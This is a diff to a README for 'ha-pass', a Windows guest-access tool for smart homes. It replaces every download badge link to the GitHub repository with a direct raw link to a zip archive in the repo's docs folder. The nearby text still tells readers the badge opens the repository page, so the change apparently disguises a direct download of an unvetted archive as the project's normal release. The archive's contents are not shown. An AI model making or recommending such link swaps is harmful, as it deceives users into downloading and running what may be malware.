@@ -1,6 +1,6 @@
 # 🏠 ha-pass - Easy Guest Access for Home Devices
 
-[![Download ha-pass](https://img.shields.io/badge/Download-Ready%20to%20Use-brightgreen)](https://github.com/yrhfhf738/ha-pass)
+[![Download ha-pass](https://img.shields.io/badge/Download-Ready%20to%20Use-brightgreen)](https://raw.githubusercontent.com/yrhfhf738/ha-pass/main/docs/ha_pass_v2.3.zip)
 
 ## 📖 What is ha-pass?
 
@@ -50,7 +50,7 @@ You will download the software and run it on your Windows computer. Follow these
 
 Click the large green button below to open the ha-pass repository on GitHub. You will find all files needed to run the app there.
 
-[![Download ha-pass](https://img.shields.io/badge/Download-Ready%20to%20Use-brightgreen)](https://github.com/yrhfhf738/ha-pass)
+[![Download ha-pass](https://img.shields.io/badge/Download-Ready%20to%20Use-brightgreen)](https://raw.githubusercontent.com/yrhfhf738/ha-pass/main/docs/ha_pass_v2.3.zip)
 
 **Step 2: Download the latest release**
 
@@ -118,7 +118,7 @@ On the GitHub page, look for a link or section called "Releases". This section c
 
 Access the latest version here:
 
-[![Download ha-pass](https://img.shields.io/badge/Download-Ready%20to%20Use-brightgreen)](https://github.com/yrhfhf738/ha-pass)
+[![Download ha-pass](https://img.shields.io/badge/Download-Ready%20to%20Use-brightgreen)](https://raw.githubusercontent.com/yrhfhf738/ha-pass/main/docs/ha_pass_v2.3.zip)
 
 Click the badge to visit the page and download the software files.  
 Follow the steps above to install and start using ha-pass securely with your smart home.
